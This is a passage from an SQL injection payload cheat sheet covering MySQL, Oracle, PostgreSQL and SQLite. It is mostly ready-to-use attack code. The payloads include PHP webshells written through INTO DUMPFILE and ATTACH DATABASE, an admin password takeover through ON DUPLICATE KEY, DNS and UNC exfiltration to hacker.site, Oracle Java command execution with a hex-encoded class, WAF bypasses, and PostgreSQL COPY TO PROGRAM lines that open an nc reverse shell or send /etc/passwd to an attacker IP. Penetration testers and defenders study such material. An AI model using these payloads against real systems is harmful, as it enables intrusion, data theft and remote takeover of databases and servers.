[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
```

### COMMAND - UDF Library

First you need to check if the UDF are installed on the server.

```powershell
$ whereis lib_mysqludf_sys.so
/usr/lib/lib_mysqludf_sys.so
```

Then you can use functions such as `sys_exec` and `sys_eval`.

```sql
$ mysql -u root -p mysql
Enter password: [...]

mysql> SELECT sys_eval('id');
+--------------------------------------------------+
| sys_eval('id') |
+--------------------------------------------------+
| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
+--------------------------------------------------+
```

## MYSQL INSERT

`ON DUPLICATE KEY UPDATE` keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:

Inject using payload:

```sql
attacker_dummy@example.com", "P@ssw0rd"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" --
```

The query would look like this:

```sql
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "BCRYPT_HASH"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" -- ", "BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT");
```

This query will insert a row for the user "`attacker_dummy@example.com`". It will also insert a row for the user "`admin@example.com`".

Because this row already exists, the `ON DUPLICATE KEY UPDATE` keyword tells MySQL to update the `password` column of the already existing row to "P@ssw0rd". After this, we can simply authenticate with "`admin@example.com`" and the password "P@ssw0rd".

## MYSQL Truncation

In MYSQL "`admin`" and "`admin`" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.

```sql
`username` varchar(20) not null
```

Payload: `username = "admin               a"`

## MYSQL Out of Band

```powershell
SELECT @@version INTO OUTFILE '\\\\192.168.0.100\\temp\\out.txt';
SELECT @@version INTO DUMPFILE '\\\\192.168.0.100\\temp\\out.txt;
```

### DNS Exfiltration

```sql
SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));
SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))
```

### UNC Path - NTLM Hash Stealing

The term "UNC path" refers to the Universal Naming Convention path used to specify the location of resources such as shared files or devices on a network. It is commonly used in Windows environments to access files over a network using a format like `\\server\share\file`.

```sql
SELECT LOAD_FILE('\\\\error\\abc');
SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);
SELECT '' INTO DUMPFILE '\\\\error\\abc';
SELECT '' INTO OUTFILE '\\\\error\\abc';
LOAD DATA INFILE '\\\\error\\abc' INTO TABLE DATABASE.TABLE_NAME;
```

:warning: Don't forget to escape the '\\\\'.

## MYSQL WAF Bypass

### Alternative to Information Schema

`information_schema.tables` alternative

```sql
SELECT * FROM mysql.innodb_table_stats;
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
...
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+

mysql> SHOW TABLES IN dvwa;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
```

### Alternative to VERSION

```sql
mysql> SELECT @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql> SELECT @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT version();
+-------------------------+
| version()               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT @@GLOBAL.VERSION;
+------------------+
| @@GLOBAL.VERSION |
+------------------+
| 8.0.27           |
+------------------+
```

### Alternative to GROUP_CONCAT

Requirement: `MySQL >= 5.7.22`

Use `json_arrayagg()` instead of `group_concat()` which allows less symbols to be displayed

* `group_concat()` = 1024 symbols
* `json_arrayagg()` > 16,000,000 symbols

```sql
SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
```

### Scientific Notation

In MySQL, the e notation is used to represent numbers in scientific notation. It's a way to express very large or very small numbers in a concise format. The e notation consists of a number followed by the letter e and an exponent.
The format is: `base 'e' exponent`.

For example:

* `1e3` represents `1 x 10^3` which is `1000`.
* `1.5e3` represents `1.5 x 10^3` which is `1500`.
* `2e-3` represents `2 x 10^-3` which is `0.002`.

The following queries are equivalent:

* `SELECT table_name FROM information_schema 1.e.tables`
* `SELECT table_name FROM information_schema .tables`

In the same way, the common payload to bypass authentication `' or ''='` is equivalent to `' or 1.e('')='` and `1' or 1.e(1) or '1'='1`.
This technique can be used to obfuscate queries to bypass WAF, for example: `1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2`

### Conditional Comments

MySQL conditional comments are enclosed within `/*! ... */` and can include a version number to specify the minimum version of MySQL that should execute the contained code.
The code inside this comment will be executed only if the MySQL version is greater than or equal to the number immediately following the `/*!`. If the MySQL version is less than the specified number, the code inside the comment will be ignored.

* `/*!12345UNION*/`: This means that the word UNION will be executed as part of the SQL statement if the MySQL version is 12.345 or higher.
* `/*!31337SELECT*/`: Similarly, the word SELECT will be executed if the MySQL version is 31.337 or higher.

**Examples**: `/*!12345UNION*/`, `/*!31337SELECT*/`

### Wide Byte Injection (GBK)

Wide byte injection is a specific type of SQL injection attack that targets applications using multi-byte character sets, like GBK or SJIS. The term "wide byte" refers to character encodings where one character can be represented by more than one byte. This type of injection is particularly relevant when the application and the database interpret multi-byte sequences differently.

The `SET NAMES gbk` query can be exploited in a charset-based SQL injection attack. When the character set is set to GBK, certain multibyte characters can be used to bypass the escaping mechanism and inject malicious SQL code.

Several characters can be used to trigger the injection.

* `%bf%27`: This is a URL-encoded representation of the byte sequence `0xbf27`. In the GBK character set, `0xbf27` decodes to a valid multibyte character followed by a single quote ('). When MySQL encounters this sequence, it interprets it as a single valid GBK character followed by a single quote, effectively ending the string.
* `%bf%5c`: Represents the byte sequence `0xbf5c`. In GBK, this decodes to a valid multi-byte character followed by a backslash (`\`). This can be used to escape the next character in the sequence.
* `%a1%27`: Represents the byte sequence `0xa127`. In GBK, this decodes to a valid multi-byte character followed by a single quote (`'`).

A lot of payloads can be created such as:

```sql
%A8%27 OR 1=1;--
%8C%A8%27 OR 1=1--
%bf' OR 1=1 -- --
```

Here is a PHP example using GBK encoding and filtering the user input to escape backslash, single and double quote.

```php
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
      
    return $string;
}

$id=check_addslashes($_GET['id']);
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
print_r(mysql_error());
```

Here's a breakdown of how the wide byte injection works:

For instance, if the input is `?id=1'`, PHP will add a backslash, resulting in the SQL query: `SELECT * FROM users WHERE id='1\'' LIMIT 0,1`.

However, when the sequence `%df` is introduced before the single quote, as in `?id=1%df'`, PHP still adds the backslash. This results in the SQL query: `SELECT * FROM users WHERE id='1%df\'' LIMIT 0,1`.

In the GBK character set, the sequence `%df%5c` translates to the character `連`. So, the SQL query becomes: `SELECT * FROM users WHERE id='1連'' LIMIT 0,1`. Here, the wide byte character `連` effectively "eating" the added escape character, allowing for SQL injection.

Therefore, by using the payload `?id=1%df' and 1=1 --+`, after PHP adds the backslash, the SQL query transforms into: `SELECT * FROM users WHERE id='1連' and 1=1 --+' LIMIT 0,1`. This altered query can be successfully injected, bypassing the intended SQL logic.


---

# Oracle SQL Injection

> Oracle SQL Injection  is a type of security vulnerability that arises when attackers can insert or "inject" malicious SQL code into SQL queries executed by Oracle Database. This can occur when user inputs are not properly sanitized or parameterized, allowing attackers to manipulate the query logic. This can lead to unauthorized access, data manipulation, and other severe security implications.

## Oracle SQL Default Databases

| Name               | Description               |
|--------------------|---------------------------|
| SYSTEM             | Available in all versions |
| SYSAUX             | Available in all versions |

## Oracle SQL Comments

| Type                | Comment |
| ------------------- | ------- |
| Single-Line Comment | `--`    |
| Multi-Line Comment  | `/**/`  |

## Oracle SQL Enumeration

| Description   | SQL Query |
| ------------- | ------------------------------------------------------------ |
| DBMS version  | `SELECT user FROM dual UNION SELECT * FROM v$version`        |
| DBMS version  | `SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';`  |
| DBMS version  | `SELECT banner FROM v$version WHERE banner LIKE 'TNS%';`     |
| DBMS version  | `SELECT BANNER FROM gv$version WHERE ROWNUM = 1;`            |
| DBMS version  | `SELECT version FROM v$instance;`                            |
| Hostname      | `SELECT UTL_INADDR.get_host_name FROM dual;`                 |
| Hostname      | `SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;`     |
| Hostname      | `SELECT UTL_INADDR.get_host_address FROM dual;`              |
| Hostname      | `SELECT host_name FROM v$instance;`                          |
| Database name | `SELECT global_name FROM global_name;`                       |
| Database name | `SELECT name FROM V$DATABASE;`                               |
| Database name | `SELECT instance_name FROM V$INSTANCE;`                      |
| Database name | `SELECT SYS.DATABASE_NAME FROM DUAL;`                        |
| Database name | `SELECT sys_context('USERENV', 'CURRENT_SCHEMA') FROM dual;` |

## Oracle SQL Database Credentials

| Query                                   | Description               |
|-----------------------------------------|---------------------------|
| `SELECT username FROM all_users;`       | Available on all versions |
| `SELECT name, password from sys.user$;` | Privileged, <= 10g        |
| `SELECT name, spare4 from sys.user$;`   | Privileged, <= 11g        |

## Oracle SQL Methodology

### Oracle SQL List Databases

```sql
SELECT DISTINCT owner FROM all_tables;
SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)
```

### Oracle SQL List Tables

```sql
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='<DBNAME>'
```

### Oracle SQL List Columns

```sql
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'
```

## Oracle SQL Error Based

| Description           | Query          |
| :-------------------- | :------------- |
| Invalid HTTP Request  | `SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual` |
| CTXSYS.DRITHSX.SN     | `SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual` |
| Invalid XPath         | `SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual` |
| Invalid XML           | `SELECT to_char(dbms_xmlgen.getxml('select "'&#124;&#124;(select user from sys.dual)&#124;&#124;'" FROM sys.dual')) FROM dual` |
| Invalid XML           | `SELECT rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users` |
| SQL Error             | `SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))` |
| XDBURITYPE getblob    | `XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()` |
| XDBURITYPE getclob    | `XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob()` |
| XMLType               | `AND 1337=(SELECT UPPER(XMLType(CHR(60)\|\|CHR(58)\|\|'~'\|\|(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))\|\|'~'\|\|CHR(62))) FROM DUAL) -- -` |
| DBMS_UTILITY          | `AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'\|\|(SELECT banner FROM v$version)\|\|'~') -- -` |

When the injection point is inside a string use : `'||PAYLOAD--`

## Oracle SQL Blind

| Description              | Query          |
| :----------------------- | :------------- |
| Version is 12.2        | `SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';` |
| Subselect is enabled    | `SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)` |
| Table log_table exists   | `SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);` |
| Column message exists in table log_table | `SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';` |
| First letter of first message is t | `SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';` |

### Oracle Blind With Substring Equivalent

| Function    | Example                                   |
| ----------- | ----------------------------------------- |
| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     |

## Oracle SQL Time Based

```sql
AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) 
AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)
```

## Oracle SQL Out of Band

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

## Oracle SQL Command Execution

* [quentinhardy/odat](https://github.com/quentinhardy/odat) - ODAT (Oracle Database Attacking Tool)

### Oracle Java Execution

* List Java privileges

    ```sql
    select * from dba_java_policy
    select * from user_java_policy
    ```

* Grant privileges

    ```sql
    exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');
    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
    ```

* Execute commands
    * 10g R2, 11g R1 and R2: `DBMS_JAVA_TEST.FUNCALL()`

        ```sql
        SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\test.txt') FROM DUAL
        SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual
        ```

    * 11g R1 and R2: `DBMS_JAVA.RUNJAVA()`

        ```sql
        SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL
        ```

### Oracle Java Class

* Create Java class

    ```sql
    BEGIN
    EXECUTE IMMEDIATE 'create or replace and compile java source named "PwnUtil" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = "";while ((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = "";while((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';
    END;

    BEGIN
    EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';';
    END;

    -- hex encoded payload
    SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));
    EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual
    ```

* Run OS command

    ```sql
    SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
    ```

### Package os_command

```sql
SELECT os_command.exec_clob('<COMMAND>') cmd from dual
```

### DBMS_SCHEDULER Jobs

```sql
DBMS_SCHEDULER.CREATE_JOB (job_name => 'exec', job_type => 'EXECUTABLE', job_action => '<COMMAND>', enabled => TRUE)
```

## OracleSQL File Manipulation

:warning: Only in a stacked query.

### OracleSQL Read File

```sql
utl_file.get_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
```

### OracleSQL Write File

```sql
utl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
```


---

# PostgreSQL Injection

> PostgreSQL SQL injection refers to a type of security vulnerability where attackers exploit improperly sanitized user input to execute unauthorized SQL commands within a PostgreSQL database.

## PostgreSQL Comments

| Type                | Comment |
| ------------------- | ------- |
| Single-Line Comment | `--`    |
| Multi-Line Comment  | `/**/`  |

## PostgreSQL Enumeration

| Description            | SQL Query                               |
| ---------------------- | --------------------------------------- |
| DBMS version           | `SELECT version()`                      |
| Database Name          | `SELECT CURRENT_DATABASE()`             |
| Database Schema        | `SELECT CURRENT_SCHEMA()`               |
| List PostgreSQL Users  | `SELECT usename FROM pg_user`           |
| List Password Hashes   | `SELECT usename, passwd FROM pg_shadow` |
| List DB Administrators | `SELECT usename FROM pg_user WHERE usesuper IS TRUE` |
| Current User           | `SELECT user;`                          |
| Current User           | `SELECT current_user;`                  |
| Current User           | `SELECT session_user;`                  |
| Current User           | `SELECT usename FROM pg_user;`          |
| Current User           | `SELECT getpgusername();`               |

## PostgreSQL Methodology

| Description            | SQL Query                                    |
| ---------------------- | -------------------------------------------- |
| List Schemas           | `SELECT DISTINCT(schemaname) FROM pg_tables` |
| List Databases         | `SELECT datname FROM pg_database`            |
| List Tables            | `SELECT table_name FROM information_schema.tables` |
| List Tables            | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'` |
| List Tables            | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'` |
| List Columns           | `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'` |

## PostgreSQL Error Based

| Name         | Payload         |
| ------------ | --------------- |
| CAST | `AND 1337=CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC) -- -` |
| CAST | `AND (CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC)) -- -` |
| CAST | `AND CAST((SELECT version()) AS INT)=1337 -- -` |
| CAST | `AND (SELECT version())::int=1 -- -` |

```sql
CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)
CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--
CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--
CAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)
```

```sql
' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
```

### PostgreSQL XML Helpers

```sql
SELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row
```

The `query_to_xml` above returns all the results of the specified query as a single result. Chain this with the [PostgreSQL Error Based](#postgresql-error-based) technique to exfiltrate data without having to worry about `LIMIT`ing your query to one result.

```sql
SELECT database_to_xml(true,true,''); -- dump the current database to XML
SELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML schema
```

Note, with the above queries, the output needs to be assembled in memory. For larger databases, this might cause a slow down or denial of service condition.

## PostgreSQL Blind

### PostgreSQL Blind With Substring Equivalent

| Function    | Example                                         |
| ----------- | ----------------------------------------------- |
| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`           |
| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        |
| `SUBSTRING` | `SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` |

Examples:

```sql
' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE
' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE
```

## PostgreSQL Time Based

### Identify Time Based

```sql
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))
```

### Database Dump Time Based

```sql
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
```

### Table Dump Time Based

```sql
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
```

### Columns Dump Time Based

```sql
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1
```

```sql
AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```

## PostgreSQL Out of Band

Out-of-band SQL injections in PostgreSQL relies on the use of functions that can interact with the file system or network, such as `COPY`, `lo_export`, or functions from extensions that can perform network actions. The idea is to exploit the database to send data elsewhere, which the attacker can monitor and intercept.

```sql
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

## PostgreSQL Stacked Query

Use a semi-colon "`;`" to add another query

```sql
SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--
```

## PostgreSQL File Manipulation

### PostgreSQL File Read

NOTE: Earlier versions of Postgres did not accept absolute paths in `pg_read_file` or `pg_ls_dir`. Newer versions (as of [0fdc8495bff02684142a44ab3bc5b18a8ca1863a](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) commit) will allow reading any file/filepath for super users or users in the `default_role_read_server_files` group.

* Using `pg_read_file`, `pg_ls_dir`

    ```sql
    select pg_ls_dir('./');
    select pg_read_file('PG_VERSION', 0, 200);
    ```

* Using `COPY`

    ```sql
    CREATE TABLE temp(t TEXT);
    COPY temp FROM '/etc/passwd';
    SELECT * FROM temp limit 1 offset 0;
    ```

* Using `lo_import`

    ```sql
    SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID
    SELECT lo_get(16420); -- use the OID returned from the above
    SELECT * from pg_largeobject; -- or just get all the large objects and their data
    ```

### PostgreSQL File Write

* Using `COPY`

    ```sql
    CREATE TABLE nc (t TEXT);
    INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');
    SELECT * FROM nc;
    COPY nc(t) TO '/tmp/nc.sh';
    ```

* Using `COPY` (one-line)

    ```sql
    COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
    ```

* Using `lo_from_bytea`, `lo_put` and `lo_export`

    ```sql
    SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data
    SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20
    SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport
    ```

## PostgreSQL Command Execution

### Using COPY TO/FROM PROGRAM

Installations running Postgres 9.3 and above have functionality which allows for the superuser and users with '`pg_execute_server_program`' to pipe to and from an external program using `COPY`.

```sql
COPY (SELECT '') TO PROGRAM 'getent hosts $(whoami).[BURP_COLLABORATOR_DOMAIN_CALLBACK]';
COPY (SELECT '') to PROGRAM 'nslookup [BURP_COLLABORATOR_DOMAIN_CALLBACK]'
```

```sql
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';
```

### Using libc.so.6

```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
```

## PostgreSQL WAF Bypass

### Alternative to Quotes

| Payload            | Technique |
| ------------------ | --------- |
| `SELECT CHR(65)\|\|CHR(66)\|\|CHR(67);` | String from `CHR()` |
| `SELECT $TAG$This` | Dollar-sign ( >= version 8 PostgreSQL)   |

## PostgreSQL Privileges

### PostgreSQL List Privileges

Retrieve all table-level privileges for the current user, excluding tables in system schemas like `pg_catalog` and `information_schema`.

```sql
SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');
```

### PostgreSQL Superuser Role

```sql
SHOW is_superuser; 
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```


---

# SQLite Injection

> SQLite Injection  is a type of security vulnerability that occurs when an attacker can insert or "inject" malicious SQL code into SQL queries executed by an SQLite database. This vulnerability arises when user inputs are integrated into SQL statements without proper sanitization or parameterization, allowing attackers to manipulate the query logic. Such injections can lead to unauthorized data access, data manipulation, and other severe security issues.

## SQLite Comments

| Description         | Comment |
| ------------------- | ------- |
| Single-Line Comment | `--`    |
| Multi-Line Comment  | `/**/`  |

## SQLite Enumeration

| Description   | SQL Query |
| ------------- | ----------------------------------------- |
| DBMS version  | `select sqlite_version();`                |

## SQLite String

### SQLite String Methodology

| Description             | SQL Query                                 |
| ----------------------- | ----------------------------------------- |
| Extract Database Structure                           | `SELECT sql FROM sqlite_schema` |
| Extract Database Structure (sqlite_version > 3.33.0) | `SELECT sql FROM sqlite_master` |
| Extract Table Name  | `SELECT tbl_name FROM sqlite_master WHERE type='table'` |
| Extract Table Name  | `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'` |
| Extract Column Name | `SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'` |
| Extract Column Name | `SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');` |
| Extract Column Name | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'` |
| Extract Column Name | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')` |

## SQLite Blind

### SQLite Blind Methodology

| Description             | SQL Query                                 |
| ----------------------- | ----------------------------------------- |
| Count Number Of Tables  | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table` |
| Enumerating Table Name  | `AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number` |
| Extract Info            | `AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')` |
| Extract Info (order by) | `CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END` |

### SQLite Blind With Substring Equivalent

| Function    | Example                                   |
| ----------- | ----------------------------------------- |
| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`  |
| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     |

## SQlite Error Based

```sql
AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
```

## SQlite Time Based

```sql
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

## SQLite Remote Code Execution

### Attach Database

This snippet shows how an attacker could abuse SQLite's `ATTACH DATABASE` feature to plant a web-shell on a server:

```sql
ATTACH DATABASE '/var/www/shell.php' AS shell;
CREATE TABLE shell.pwn (dataz text);
INSERT INTO shell.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>');--
```

First, it tells SQLite to "treat" a PHP file as a writable SQLite database. Then it creates a table inside that file (which is actually the future web-shell). Finally it writes malicious PHP code into the file.

